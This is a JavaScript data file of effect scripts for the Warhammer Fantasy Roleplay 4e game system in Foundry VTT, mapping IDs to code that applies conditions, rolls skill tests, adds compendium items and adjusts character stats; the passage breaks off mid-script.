        foundry.utils.mergeObject(game.wfrp4e.config.effectScripts, {"00ZCnahnTGvzG9KA":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.weczkAMPlTjX7lqU\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item])","01VFjGVxkjb5P1ve":"return args.item?.system?.isRanged && args.data.targets[0]?.actor?.sizeNum < 3","03mJu59V4iByWlsO":"// The imbiber immediately\n// takes 3 Poisoned Conditions that cannot be resisted at first,\nawait this.actor.addCondition(\"poisoned\", 3)\n\n// recovers a number of Wounds equal to their Toughness Bonus, \nawait this.actor.modifyWounds(this.actor.system.characteristics.t.bonus)\n\n// and acquires the Regenerate Creature Trait.\nconst hasRegenerate = this.actor.has(\"Regenerate\")\nif (hasRegenerate === undefined) {\n  fromUuid(\"Compendium.wfrp4e-core.items.SfUUdOGjdYpr3KSR\").then(trait => {\n    let traitItem = trait.toObject()\n    this.actor.createEmbeddedDocuments(\"Item\", [traitItem], {fromEffect: this.effect.id})\n  })\n}\n\nthis.script.scriptMessage(`<p><strong>${this.actor.prototypeToken.name}</strong> has \n    <ul>\n      <li>gained 3 Poisoned Conditions that cannot be resisted at first</li>\n      <li>recovered ${this.actor.system.characteristics.t.bonus} Wounds</li>\n      <li>acquired the Regenerate Creature Trait.</li>\n    </ul>\n    It’s up to Ranald if their regenerating can outpace their poisoning.</p>\n    <p>When all Poisoned Conditions are lost, so too is Regenerate.</p>`, \n    { whisper: ChatMessage.getWhisperRecipients(\"GM\"), blind: true })   \n","04bAiHISSW53w94Y":"this.actor.addCondition(\"blinded\", 3)","06IaVCOC0RCJbxEf":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.8piWcBKFlQ2J1E3A\")\nlet data = item.toObject();\ndata.system.location.key= this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data])","09sSpnW8z2zcVEdf":"if (!args.flags.quietenedApplied)\n{\n   args.fields.modifier += 10;\n   args.flags.quietenedApplied = true\n}","0BP5l7bIkf744G1k":"return !args.options.terror  && !args.extendedTest?.flags.wfrp4e?.fear","0FNOq4J1AdPd2A0q":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Row\")) && !args.skill?.name.includes(game.i18n.localize(\"NAME.Sail\"));","0FWto1oEr3jbWggw":"let spells = await game.wfrp4e.utility.findAll(\"spell\", \"Loading Spells\")\n\nlet text = (await game.wfrp4e.tables.rollTable(\"random-caster\", {hideDSN: true})).result\n\nlore = Array.from(text.matchAll(/{(.+?)}/gm))[0][1]\n\nif (text == \"GM's Choice\")\n{\n    return this.script.scriptNotification(text)\n}\n\nif (spellsWithLore.length > 0)\n{\n    let spellsWithLore = spells.filter(i => game.wfrp4e.config.magicLores[i.system.lore.value] == lore)\n    let selectedSpell = spellsWithLore[Math.floor(CONFIG.Dice.randomUniform() * spellsWithLore.length)]\n    this.script.scriptNotification(selectedSpell.name);\n    this.actor.createEmbeddedDocuments(\"Item\", [selectedSpell])\n}\nelse\n{\n    ui.notifications.notify(`Could not find ${lore} spell. Try Again`)\n}","0KG3HoTNoZhaINIj":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.4CMKeDTDrRQZbPIJ\")\nlet fixation = (await game.wfrp4e.tables.rollTable(\"fixations\"))\nlet data = item.toObject();\ndata.system.specification.value = fixation.result;\nthis.item.updateSource({name : this.item.name += ` (${fixation.result})`});\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","0LCQtsiK2aUfYRmD":"return ![\"t\", \"wp\"].includes(args.characteristic)","0R0QAr3D024kWPfo":"let table = game.wfrp4e.tables.findTable(\"mutatephys\");\nif (!table)\n{\n\treturn ui.notifications.error(\"Mutation table not found, please ensure a table with the `mutatephys` key is imported in the world.\")\n}\nlet result = (await table.roll()).results[0];\nlet uuid = `Compendium.${result.documentCollection}.${result.documentId}`\nlet item = await fromUuid(uuid);\n\nif (item)\n{\n    this.script.scriptNotification(`${item.name} added`)\n    this.actor.createEmbeddedDocuments(\"Item\", [item])\n}\nelse \n{\n    ui.notifications.error(\"Item could not be found: \" + uuid)\n}","0Uly7OmkH0zqYbxQ":"let location = this.item.system.location.key;\n\nif (location)\n{\n    let dropped = this.item.system.weaponsAtLocation;\n\n    if (dropped.length)\n    {\n        this.script.scriptNotification(`Dropped ${dropped.map(i => i.name).join(\", \")}!`)\n        for(let weapon of dropped)\n        {\n            await weapon.system.toggleEquip();\n        }\n    }\n}\n\nlet roll = await new Roll(\"max(1, 1d10 - @system.characteristics.t.bonus)\", this.actor).roll()\n\nroll.toMessage(this.script.getChatData({flavor : `${this.effect.name} (Duration)`}));\n\nthis.effect.updateSource({\"duration.rounds\" : roll.total})","0YKQGbsKdHSmYGE7":"if (args.skill?.name != game.i18n.localize(\"NAME.Gossip\"))\n{\n\treturn true;\n}\nelse \n{\n\targs.data.canReverse = true; // Kind of a kludge here, the talent Tests has a specific condition, but the description simply says \"any gossip test can be reversed\" so check it here instead of submission\n}\n    ","0abwNjpzo3SbEOeO":"if (args.applyAP && args.modifiers.ap.metal) \n{\n    args.modifiers.ap.ignored += args.modifiers.ap.metal\n    args.modifiers.ap.details.push(\"<strong>\" + this.effect.name + \"</strong>: Ignore Metal (\" + args.modifiers.ap.metal + \")\");\n    args.modifiers.ap.metal = 0\n}","0e0UZT2FodOJDdgW":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.GbDyBCu8ZjDp6dkj\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","0e7OkamNAaAk4Oit":"let item1 = await fromUuid(\"Compendium.wfrp4e-core.items.3S4OYOZLauXctmev\")\nlet item2 = await fromUuid(\"Compendium.wfrp4e-core.items.7mCcI3q7hgWcmbBU\")\n\nlet data1 = item1.toObject();\ndata1.system.location.key = this.item.system.location.key\n\nlet data2 = item2.toObject();\ndata2.system.location.key = this.item.system.location.key\n\nthis.actor.createEmbeddedDocuments(\"Item\", [data1, data2], {fromEffect: this.effect.id})\n","0iTLDgFHO9Rgc010":"args.fields.modifier -= 20;","0mrUnxzufYgsR0Ph":"this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`}).then(async test => {\n    await test.roll()\n    if (test.failed)\n    {\n        this.actor.addCondition(\"stunned\")\n    }\n})\n","0vaYwAlMWTmOBl8k":"if (!args.flags.strikeToStun)\n{\n    args.flags.strikeToStun = true\n    args.fields.modifier += 20;\n    args.fields.hitLocation = \"head\";\n}\nargs.fields.successBonus++;","0yyofYHeDRQlFliO":"return args.options.terror  || args.extendedTest?.flags.wfrp4e?.fear","11uCC0mK2uL783al":"let type = this.item.getFlag(\"wfrp4e\", \"breath\");\n\nif ([\"fire\", \"electricity\", \"poison\"].includes(type))\n{\n    args.applyAP = false;\n}","16nCOByUaSFDym1V":"args.fields.modifier -= 20\n","18MeEQ0As3JvER71":"let state = !this.effect.disabled;\nthis.effect.update({\"disabled\": state});\n\nif (state)\n  return ui.notifications.info(\"EFFECT.CreatureBackInWater\", {localize: true})\n\nreturn ui.notifications.info(\"EFFECT.CreatureOutOfWater\", {localize: true});","190PHSHKGaJ74wsR":"if (!this.item.name.includes(\"(\") || this.item.system.tests.value.includes(\"Terrain\") || this.item.system.tests.value.toLowerCase().includes(\"(any)\"))\n{\n    let tests = this.item.system.tests.value\n    let name = this.item.name\n\n    // If name already specifies, make sure tests value reflects that\n    if (name.includes(\"(\") && !name.toLowerCase().includes(\"(any)\"))\n    {\n        let terrain = name.split(\"(\")[1].split(\")\")[0]\n        tests = tests.replace(\"the Terrain\", terrain)\n    }\n    else // If no sense specified, provide dialog choice\n    {\n        let choice = await ItemDialog.create(ItemDialog.objectToArray({\n            coastal : \"Coastal\",\n            deserts : \"Deserts\",\n            marshes : \"Marshes\",\n            rocky : \"Rocky\",\n            tundra : \"Tundra\",\n            woodlands : \"Woodlands\"\n        }, this.item.img), 1, \"Choose Terrain\");\n        if (choice[0])\n        {\n            name = `${name.split(\"(\")[0].trim()} (${choice[0].name})`\n            tests = tests.replace(\"the Terrain\", choice[0].name + \" Terrain\")\n        }\n    }\n\n    this.effect.updateSource({name})\n    this.item.updateSource({name, \"system.tests.value\" : tests})\n}","1A87vGLh2PXH0rG0":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Language\"));","1BT0MWM2cbhlEnrn":"        let characteristics = {\n            \"ws\" : 5,\n            \"bs\" : 5,\n            \"s\" : 5,\n            \"t\" : 0,\n            \"i\" : 5,\n            \"ag\" : 5,\n            \"dex\" : 5,\n            \"int\" : 0,\n            \"wp\" : 5,\n            \"fel\" : 5\n        }\n        let items = []\n\n        let updateObj = this.actor.toObject();\n\n        let talents = (await Promise.all([game.wfrp4e.tables.rollTable(\"talents\"), game.wfrp4e.tables.rollTable(\"talents\"), game.wfrp4e.tables.rollTable(\"talents\")])).map(i => i.text)\n        \n        for (let ch in characteristics)\n        {\n            updateObj.system.characteristics[ch].modifier += characteristics[ch];\n        }\n        \n        for (let talent of talents)\n        {\n            let talentItem = await game.wfrp4e.utility.findTalent(talent)\n            if (talentItem)\n            {\n                items.push(talentItem.toObject());\n            }\n            else \n            {\n                ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n            }\n        }\n      \n        \n        await this.actor.update(updateObj)\n        this.actor.createEmbeddedDocuments(\"Item\", items);\n    \n","1CeYp5MlPcH68UIw":"let characteristics = {\n    \"ws\" : 15,\n    \"bs\" : 10,\n    \"s\" : 10,\n    \"t\" : 15,\n    \"i\" : 10,\n    \"ag\" : 0,\n    \"dex\" : 0,\n    \"int\" : 10,\n    \"wp\" : 10,\n    \"fel\" : 10\n}\nlet skills = [\"Intimidate\", \"Leadership\", \"Perception\"]\nlet skillAdvancements = [10, 10, 10]\nlet talents = [\"Combat Aware\", \"Drilled\", \"Menacing\", \"Robust\"]\nlet trappings = [\"Hand Weapon\", \"Mail Coat\", \"Mail Chausses\"]\nlet specialItems = [ \n]    \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nconsole.log(\">>>>>>><\", items)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","1E47r2ba6IGe8uFK":"return args.characteristic != \"t\"","1IodsW9ImamYoEYz":"args.actor.details.move.run += 4","1JwxZujbDcueLWBL":"await this.actor.addCondition(\"ablaze\", 2)\nawait this.script.scriptMessage(await this.actor.applyBasicDamage(this.effect.sourceTest.result.damage, {suppressMsg: true}))","1LDSzXeO5CzXgTOc":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Channelling\")) || args.skill?.name == `${game.i18n.localize(\"NAME.Language\")} (${game.i18n.localize(\"SPEC.Magick\")})`","1LDm3OB32skZe6Xv":"return args.characteristic != \"wp\"","1MDOKny7IirJPoI6":"let test = await this.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  ` ${this.effect.name}`})\nawait test.roll()\nif (test.succeeded)\n{\n    this.effect.delete();\n}\n","1OpT3CXs07XFWWCT":"args.options.cardsharp = true;","1PQPxFjmRlulHHzo":"if (args.opposedTest.result.hitloc.value == this.item.system.location.key && args.totalWoundLoss > 0)\n{\n    args.actor.addCondition(\"bleeding\", 2);\n}\n    ","1UalUmNzjB4rp3SZ":"return [\"ws\", \"bs\", \"s\", \"ag\", \"t\", \"dex\"].includes(args.characteristic)","1ZArMNUI8qqH6zkX":"let test = await args.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  \" - \" + this.effect.name, context : {failure: \"Gained a Stunned Condition\"}})\nawait test.roll();\nif (test.failed)\n{\n    args.actor.addCondition(\"stunned\")\n}\n\n","1ZrzpfVwPJHdwp23":"this.actor.status.addArmour(1, {source: this.effect, magical : true})","1exiWlVUHsXDLLAH":"this.script.scriptNotification(`Cannot enter ${this.effect.name}!`);","1fQr1Dg7DX0vfz3r":"let healed = parseInt(this.effect.sourceTest.result.SL)\nthis.actor.modifyWounds(healed)\nthis.script.scriptMessage(`Healed ${healed} Wounds`)","1jQq9v8fXK8zuEBU":"let damage = this.effect.sourceActor.hasCondition(\"fatigued\") ? 6 : 10;\n\nlet loc = \"body\"\n\nlet APatLoc = this.actor.system.status.armour[loc];\n\nlet metalAP = APatLoc.layers.reduce((metal, layer) => metal += ((layer.metal && !layer.magical) ? layer.value : 0), 0)\n\nlet APused = Math.max(0, APatLoc.value - metalAP); // remove metal AP at location;\n\ndamage -= (APused + this.actor.system.characteristics.t.bonus)\n\nlet msg = await this.actor.applyBasicDamage(damage, {suppressMsg : true, damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL});\nmsg += ` (ignored ${metalAP} metal AP on ${game.wfrp4e.config.locations[loc]})`\nthis.script.scriptMessage(msg)\n\nlet test = await this.actor.setupSkill(\"Endurance\", {fields : {difficulty : \"difficult\"}, appendTitle : ` - ${this.effect.name}`});\nawait test.roll();\nif (test.failed)\n\tthis.actor.addCondition(\"stunned\");","1kB2su7hLRYDhZ2H":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name})\nawait test.roll();\nif (!test.succeeded)\n{\n    let item = await fromUuid(\"Compendium.wfrp4e-core.items.ZhMADOqoo0y8Q9bx\")\n    let data = item.toObject();\n    if (this.item.system.location.key == \"rLeg\")\n    {\n        data.system.location.value = \"Right Toe\"\n\tdata.system.location.key = \"rToe\";\n    }\n    else if (this.item.system.location.key == \"lLeg\")\n    {\n        data.system.location.value = \"Left Toe\"\n\tdata.system.location.key = \"lToe\";\n    }\n    this.actor.createEmbeddedDocuments(\"Item\", [data])\n}\nthis.effect.delete();","1l7Jz2ZHbAWko7Vm":"args.options.ballockKnife = true;","1mNkLj9JYNr3ofC6":"this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`}).then(async test => {\n    await test.roll();\n    if (test.failed)\n    {\n        this.actor.addCondition(\"stunned\", 3)\n    }\n})","1wEjrgff7ASxKVmy":"if (args.effect.conditionId == \"bleeding\")\n    args.data.damage -= 1","1wKVvxRTHOyV4Qdv":"return !args.skill?.name?.includes(game.i18n.localize(\"NAME.Sail\"))","1wrPvP6lJwIAfmsl":"let choice = await ItemDialog.create(ItemDialog.objectToArray(game.wfrp4e.config.locations), 1, \"Choose Location\");\n\nlet location = choice[0].id;\n\nlet itemTargeted = this.actor.items.get(this.effect.getFlag(\"wfrp4e\", \"itemTargets\")[0])\n\nif (itemTargeted)\n{\n    itemTargeted.update({[`system.APdamage.${location}`] : itemTargeted.system.APdamage[location] + 1})\n}","1yOvw74jzFfaI87b":"return args.options.reload\n","22bW97lkvCqisfHX":"return args.type != \"channelling\" && !args.skill?.name.includes(game.i18n.localize(\"NAME.Channelling\"))","23HgjCB1oecxANvA":"if (args.item.range && args.item.range.bands)\n{\nargs.item.range.bands[game.i18n.localize(\"Long Range\")].modifier = 0\nargs.item.range.bands[game.i18n.localize(\"Extreme\")].modifier /= 2\n}","23vWiHUjxtRQ3Efz":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.eWPN3CV2Eddwz8aM\")\nlet data = item.toObject();\ndata.system.location.value = \"Back\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","2AOo7KUyzMrgIlgM":"game.wfrp4e.utility.postCorruptionTest(this.item.system.specification.value, {speaker : {alias: this.actor.prototypeToken.name}})","2AdSBXw7IwCiqawQ":"return args.skill?.name == game.i18n.localize(\"NAME.Bribery\") || args.skill?.name.includes(game.i18n.localize(\"NAME.Stealth\"));","2Cw5j0iGAnFNegWr":"return args.item?.system.attackType\n","2GYAd4OC888oQFBp":"return ![\"fel\"].includes(args.characteristic)","2NLINicPQWbuvp2n":"return args.item?.name != game.i18n.localize(\"NAME.Navigation\")","2OqLHRqEBEjBm2LW":"args.fields.slBonus += this.actor.system.characteristics.wp.bonus","2QB0LjueuJcIaHaC":"if (isNaN(parseInt(this.item.system.specification.value)))\n{\n    let value = await ValueDialog.create(\"Enter Armour value\", this.effect.name);\n    if (value)\n    {\n     this.item.updateSource({\"system.specification.value\" : value});\n    }\n}","2Qi1hwLYhdE6v6Hs":"if (![\"rLeg\", \"lLeg\"].includes(this.effect.getFlag(\"wfrp4e\", \"location\")))\n\treturn true;\n\nif (args.options.dodge)\n{\n\targs.abort = true;\n\tthis.script.scriptNotification(\"Cannot Dodge!\")\n}\nreturn [\"t\", \"int\", \"wp\", \"fel\"].includes(args.characteristic)","2VNnVrtktdGUqXEV":"if (args.totalWoundLoss > 0)\n{\n    let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\n    await test.roll();\n    if (test.failed && parseInt(args.opposedTest.attackerTest.result.SL) > 0)\n    {\n        args.actor.addCondition(\"stunned\", parseInt(args.opposedTest.attackerTest.result.SL))\n    }\n}   ","2W9uMTT6iJhfQ044":"let skill = `Trade (${this.item.parenthesesText})`\nlet currentCareer = this.actor.system.currentCareer;\nlet existingSkill = this.actor.itemTypes.skill.find(i => i.name == skill);\n\nif (!currentCareer) return\n\n\nlet inCurrentCareer = currentCareer.system.skills.includes(skill);\nlet craftsmanAdded = this.actor.getFlag(\"wfrp4e\", \"craftsmanAdded\") || {};\nif (existingSkill && inCurrentCareer && !craftsmanAdded[existingSkill.name])\n{\n\texistingSkill.system.advances.costModifier = -5;\n}\nelse \n{\n\tcraftsmanAdded[skill] = true;\n\tcurrentCareer.system.skills.push(skill);\n\tfoundry.utils.setProperty(this.actor, \"flags.wfrp4e.craftsmanAdded\", craftsmanAdded)\n}","2WBq5gW780C6zfCp":"if (args.weapon && this.item.system.usesLocation(args.weapon))\n{\n    args.bleedingHand = true;\n    let success = await this.effect.manualScripts[0].execute({actor: this.actor})\n    if (!success)\n    {\n        args.abort = true;\n    }\n}","2WSN306tL4apjRtD":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.9h82z72XGo9tfgQS\")\nlet data = item.toObject();\ndata.name = data.name += \" (Hearing)\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","2cKarG9ToyW2ptCd":"if (this.item.system.quantity.value)\n{\n\tthis.item.update({\"system.quantity.value\" : this.item.system.quantity.value - 0.25})\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n\tactor.applyEffect({effectData : [this.item.effects.contents[1].convertToApplied()]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","2hzDv8ROulOe1elK":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Lore\"));","2mFNelLOAQ6iJsZl":"if (args.test.isFumble)\n{\n    args.test.result.other.push(\"@Table[doomrocket-fumble]\")\n}","2miWWeRrEpq1beG4":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.qn4ZpvTQIX4rcJDl\");\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n","2p9IK6Y5Z4NQD6FY":"args.prefillModifiers.difficulty = \"hard\"","2rzxQlL7A9ujZ9uK":"if (args.opposedTest.result.winner == \"attacker\") {\n  if (args.opposedTest.defenderTest.weapon && args.opposedTest.defenderTest.item.properties.qualities.shield) {\n    ui.notifications.notify(`<b>${this.effect.name}</b>: Gained ${this.item.Advances} Advantage`)\n    this.actor.setAdvantage(this.item.Advances)\n  }\n}","2sDH6RvoOAR40oqH":"\n\nif (![\"Goblin\", \"Orc\"].includes(this.actor.system.details.species.value)) {\n    let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), { appendTitle: ` - ${this.effect.name}` })\n    await test.roll();\n    if (test.failed) {\n        let infection = await fromUuid(\"Compendium.wfrp4e-core.items.Item.1hQuVFZt9QnnbWzg\")\n        this.actor.createEmbeddedDocuments(\"Item\", [infection])\n    }\n}\n\n// Since wounds change when the effect is deleted, need to wait until after \n// the max wounds have been recalculated to apply damage\ngame.wfrp4e.utility.sleep(1000).then(async () => {\n    let roll = await new Roll(\"1d10\").roll();\n\n    roll.toMessage(this.script.getChatData());\n    this.script.scriptMessage(await this.actor.applyBasicDamage(roll.total, { damageType: game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg: true }))\n\n})","2vTVR0quRZQtjNfQ":"let currentCareer = this.actor.system.currentCareer;\nif (!currentCareer)\n{\n    return;\n}\n\nlet talents = [\"Aethyric Attunement\",\n\"Arcane Magic (Any)\",\n\"Chaos Magic (Tzeentch)\",\n\"Fast Hands\",\n\"Instinctive Diction\",\n\"Magical Sense\",\n\"Petty Magic\",\n\"Second Sight\",\n\"War Wizard\",\n\"Witch!\"].filter(t => !currentCareer.system.talents.includes(t))\n\ncurrentCareer.system.talents = currentCareer.system.talents.concat(talents)","2wk0yrRPlPsdqr3L":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.9GNpAqgsKzxZKJpp\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","2yctEihGmdCfTTVx":"args.data.canReverse = true;\nargs.options.fieldDressing = true;","2zeP2nMSURjxrqYz":"let wounds = this.actor.system.status.wounds\nif (wounds.value == 0)\n  return this.script.scriptNotification(\"No effect at 0 Wounds\", \"error\")\n\nthis.script.scriptNotification(`Healed ${this.actor.characteristics.t.bonus} Wounds`)\nawait this.actor.modifyWounds(this.actor.characteristics.t.bonus)","33PWizq5F7pkKnQT":"if (args.item.type == \"spell\")\n{\n    args.item.cn.value = Math.floor(args.item.cn.value / 2)\n}","33US8YRgaMqYu2We":"return !args.options.handling","37UN17gb8suFeZIW":"this.script.scriptMessage(await this.actor.applyBasicDamage(8, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg: true}))","3CdYFcInQVCIBUiE":"args.actor.system.details.move.value += 2;\nargs.actor.system.status.carries.max = Math.floor(args.actor.system.status.carries.max * 0.5);\nargs.actor.system.details.price.gc *= 1.1;","3Cn2TlRahlm5LkSj":"args.fields.successBonus += 1;","3D5ImpMgpOTPucvv":"if (args.test.options.cardsharp && args.test.succeeded)\n{\n\nlet SL = Math.floor(args.test.target / 10) - Math.floor(args.test.result.roll / 10)\nlet ones = Number(args.test.result.roll.toString().split(\"\").pop())\n\nif (ones > SL)\n   args.test.result.other.push(`<span class=\"hide-option\"><b>${this.effect.name}</b>: ${ones + args.test.successBonus + args.test.slBonus} SL</span>`)\n}","3IGO7xEjRjat937X":"let fatigue = this.actor.hasCondition(\"fatigued\")\nif (fatigue)\n{\n   this.script.scriptNotification(\"Removing Fatigued Condition, disabled effect\")\n    this.effect.update({disabled : true})\n   await this.actor.removeCondition(\"fatigued\")\n}","3JEzEzF1SeYA9lsV":"let choice = await ItemDialog.create(ItemDialog.objectToArray(game.wfrp4e.config.locations, this.effect.img), 1, \"Choose Location\");\nif (choice[0])\n{\n    this.effect.updateSource({name : `${this.effect.name} (${choice[0].name})`})\nthis.effect.updateSource({\"flags.wfrp4e.location\" : choice[0].id})\n}\n\nlet location = choice[0].id;\n\nif ([\"lArm\", \"rArm\"].includes(location))\n{\n    let dropped = this.actor.itemTypes.weapon.filter(i => i.isEquipped & i.system.usesHands.includes(location));\n\n    if (dropped.length)\n    {\n        this.script.scriptNotification(`Dropped ${dropped.map(i => i.name).join(\", \")}!`)\n        for(let weapon of dropped)\n        {\n            await weapon.system.toggleEquip();\n        }\n    }\n}\n\nif (location == \"body\")\n{\n    await this.actor.addCondition(\"fatigued\");\n    test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"hard\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\n    await test.roll();\n    if (test.failed)\n    {\n        this.actor.addCondition(\"prone\");\n    }\n}\n\nif (location == \"head\")\n{\n    await this.actor.addCondition(\"stunned\");\n    test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"average\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\n    await test.roll();\n    if (test.failed)\n    {\n        this.actor.addCondition(\"unconscious\");\n    }\n}","3LLiSgj6KGtgqcmo":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Language\"));","3R6Y4NpNTqPc83wh":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.IPKRMGry6WotuS1G\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","3TesBGh8HnlGuafu":"let modifier = this.effect.sourceTest?.result.overcast.usage.other.current || 0\n\nlet test = await this.actor.setupCharacteristic(\"dex\", {fields: {modifier}, skipTargets: true, appendTitle :  \" - \" + this.script.label});\n\ntest.roll();","3Vbe6gdW8N0bIvXJ":"if (args.item.type == \"weapon\" || args.item.type == \"trait\")\n{\n    args.item.qualities.value.push({name : \"penetrating\"})\n    args.item.qualities.value.push({name : \"impale\"})\n}","3aEzK0DehSHtVykd":"this.effect.manualScripts[0].execute({actor : this.actor});","3eSaX0BeaUalNkEP":"return args.options.mutate","3fdCQ3h3iVuhdDs9":"args.fields.slBonus += this.actor.characteristics.ag.bonus;","3hfMQkUKYI4rCuBy":"return args.skill?.name != game.i18n.localize(\"NAME.CharmAnimal\") && !args.skill?.name.includes(game.i18n.localize(\"NAME.AnimalTraining\"));","3jm0NoYpgB6ZuUSl":"args.options.useOnesAttractive = true;","3l7MQSa10Kve2K3P":"this.script.scriptMessage(await this.actor.applyBasicDamage(Math.ceil(CONFIG.Dice.randomUniform() * 10) + 6, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg : true}))\nthis.actor.addCondition(\"ablaze\");","3nTSOcCmNZpQWK8b":"this.actor.addCondition(\"blinded\", 3);","3plV9WFqs2prfAdp":"return ![\"NAME.Evaluate\", \"NAME.Gamble\"].map(i => game.i18n.localize(i)).includes(args.skill?.name)","3sfD1nedXLzuYoXJ":"if (this.actor.hasCondition(\"surprised\"))\n{\n    this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {fields : {difficulty : \"average\"}, skipTargets: true, appendTitle :  \" - \" + this.effect.name}).then(test => test.roll())\n}\n","3tE8gFSl28EhCmo5":"await args.actor.addCondition(\"ablaze\")\nawait args.actor.addCondition(\"prone\")","454x3Q95pLvZm0Kx":"return args.skill?.name == game.i18n.localize(\"NAME.ConsumeAlcohol\");","4FGKZk2f0xrmIDnp":"return args.skill?.name != game.i18n.localize(\"NAME.Research\") && !args.skill?.name?.includes(game.i18n.localize(\"NAME.Language\"));","4HN98hMdQJxM35pA":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.gz2xy41OSVZ8YBgI\");\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data])\n","4JVIy5xtVwvadoqv":"this.actor.details.move.run *= 2","4MQ7u4INxp51oyyR":"let characteristics = {\n    \"ws\" : 25,\n    \"bs\" : 10,\n    \"s\" : 15,\n    \"t\" : 15,\n    \"i\" : 25,\n    \"ag\" : 20,\n    \"dex\" : 0,\n    \"int\" : 10,\n    \"wp\" : 25,\n    \"fel\" : 10\n}\nlet skills = [\"Cool\", \"Dodge\", \"Intimidate\", \"Intuition\", \"Leadership\", \"Lore (Warfare)\", \"Perception\"]\nlet skillAdvancements = [15, 15, 15, 15, 15, 10, 10]\nlet talents = [\"Combat Aware\", \"Combat Reflexes\", \"Feint\", \"Inspiring\", \"Resolute\", \"War Leader\"]\nlet trappings = [\"Hand Weapon\", \"Shield\"]\nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += 